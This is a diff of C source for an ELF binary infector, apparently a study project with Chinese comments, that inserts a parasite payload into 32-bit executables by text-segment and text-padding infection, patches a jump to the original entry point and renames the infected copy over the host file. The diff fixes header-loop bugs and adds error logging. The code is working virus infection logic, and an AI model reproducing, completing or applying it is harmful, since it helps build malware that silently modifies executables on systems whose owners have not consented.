@@ -14,6 +14,7 @@ unsigned long inject_elf_binary(Elf32_mem_t* target, uint8_t* parasite,
 
 	uint8_t* mem = target->mem;
 	host = target->name;
+	//host = _strdup("/home/orz/CLionProjects/xxxx/helloo");
 	//人工制造STAT?
 	memset(&st, 0, sizeof(STAT));
 	st.st_size = target->size;
@@ -64,7 +65,7 @@ unsigned long inject_elf_binary(Elf32_mem_t* target, uint8_t* parasite,
 		}
 		//按页面大小增加注入后驻留的任何截面的大小
 		shdr = (Elf32_Shdr*)(ehdr->e_shoff + mem);
-		for (int i = 0; i-- > 0; shdr++) {
+		for (int i = ehdr->e_shnum; i-- > 0; shdr++) {
 			if (shdr->sh_offset >= end_of_text) {
 				shdr->sh_offset += PAGE_SIZE;
 			}
@@ -83,7 +84,7 @@ unsigned long inject_elf_binary(Elf32_mem_t* target, uint8_t* parasite,
 		phdr[0].p_offset += PAGE_SIZE;
 		phdr[1].p_offset += PAGE_SIZE;
 		//这一坨确实是不知道干什么的
-		for (int i = 0; i-- > 0; phdr++) {
+		for (int i = ehdr->e_phnum; i-- > 0; phdr++) {
 			if (text_found) {
 				phdr->p_offset += PAGE_SIZE;
 			}
@@ -120,26 +121,36 @@ Elf32_Addr text_entry_infect(unsigned int psize, unsigned char* mem, char* paras
 	unsigned int c;
 	int i, t = 0, ehdr_size = sizeof(Elf32_Ehdr);
 
-	if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
+	if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1) {
+		printf("text_entry_infect() open() error\n");
 		return WTFILE_ERR;
+	}
 
-	if (write(ofd, mem, ehdr_size) != ehdr_size)
+	if (write(ofd, mem, ehdr_size) != ehdr_size) {
+		printf("text_entry_infect() write() error\n");
 		return WTFILE_ERR;
+	}
 
 	if (jmp_code_offset != NO_JMP_CODE)
 		*(unsigned long*)&parasite[jmp_code_offset] = entry_point;
 
-	if (write(ofd, parasite, psize) != psize)
+	if (write(ofd, parasite, psize) != psize) {
+		printf("text_entry_infect() write() error\n");
 		return WTFILE_ERR;
+	}
 
-	if (lseek(ofd, ehdr_size + PAGE_SIZE, SEEK_SET) != ehdr_size + PAGE_SIZE)
+	if (lseek(ofd, ehdr_size + PAGE_SIZE, SEEK_SET) != ehdr_size + PAGE_SIZE) {
+		printf("text_entry_infect() lseek() error\n");
 		return WTFILE_ERR;
+	}
 
 	mem += ehdr_size;
 
-	if (write(ofd, mem, st.st_size - ehdr_size) != st.st_size - ehdr_size)
+	if (write(ofd, mem, st.st_size - ehdr_size) != st.st_size - ehdr_size) {
+		printf("text_entry_infect() write() error\n");
 		return WTFILE_ERR;
-
+	}
+	printf("TMP:%s, host:%s", TMP, host);
 	rename(TMP, host);
 	close(ofd);
 	return payload_entry;
@@ -154,28 +165,39 @@ Elf32_Addr text_padding_infect(unsigned int psize, unsigned char* mem,
 	unsigned int c;
 	int i, t = 0;
 
-	if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1)
+	if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1) {
+		printf("text_padding_infect() open() error, file:%s, line:%d\n", __FILE__, __LINE__);
 		return WTFILE_ERR;
+	}
 
-	if (write(ofd, mem, end_of_text) != end_of_text)
+	if (write(ofd, mem, end_of_text) != end_of_text) {
+		printf("text_padding_infect() write() error, file:%s, line:%d\n", __FILE__, __LINE__);
 		return WTFILE_ERR;
+	}
 
 	if (jmp_code_offset != NO_JMP_CODE)
 		*(unsigned long*)&parasite[jmp_code_offset] = old_e_entry;
 
-	if (write(ofd, parasite, psize) != psize)
+	if (write(ofd, parasite, psize) != psize) {
+		printf("text_padding_infect() write() error, file:%s, line:%d\n", __FILE__, __LINE__);
 		return WTFILE_ERR;
-
+	}
+	//int _err;
+	//if ((_err = lseek(ofd, PAGE_SIZE - psize, SEEK_CUR)) != PAGE_SIZE - psize) {
+	//	printf("text_padding_infect() lseek() error, file:%s, line:%d\n", __FILE__, __LINE__);
+	//	return WTFILE_ERR;
+	//}
 	lseek(ofd, PAGE_SIZE - psize, SEEK_CUR);
-
 	mem += end_of_text;
 
 	unsigned int sum = end_of_text + PAGE_SIZE;
 	unsigned int last_chunk = st.st_size - end_of_text;
 
-	if (c = write(ofd, mem, last_chunk) != last_chunk)
+	if (c = write(ofd, mem, last_chunk) != last_chunk) {
+		printf("text_padding_infect() write() error, file:%s, line:%d\n", __FILE__, __LINE__);
 		return WTFILE_ERR;
-
+	}
+	printf("TMP:%s, host:%s", TMP, host);
 	rename(TMP, host);
 	close(ofd);
 
